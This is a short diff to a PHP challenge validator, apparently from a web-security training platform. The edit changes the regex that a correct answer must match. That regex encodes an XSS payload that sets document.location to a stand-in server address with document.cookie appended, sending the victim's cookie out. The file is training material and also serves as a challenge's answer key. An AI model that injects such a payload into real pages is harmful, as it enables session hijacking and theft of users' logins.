@@ -4,7 +4,7 @@ include_once dirname(__FILE__).'/../../init.php';
 session_start();
 require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");
 
-$solution = new RegexSolution('document\.location(\.href)? ?= ?"http:\/\/yourserver\.com\/\?c=" ?\+ ?document\.cookie');
+$solution = new RegexSolution(RegexSolution::JS_BEGIN.'document\.location(\.href)? ?= ?"http:\/\/yourserver\.com\/\?c=" ?\+ ?document\.cookie'.RegexSolution::JS_END);
 $validator = new ChallengeValidatorController($solution);
 $validator->startChallenge();
 
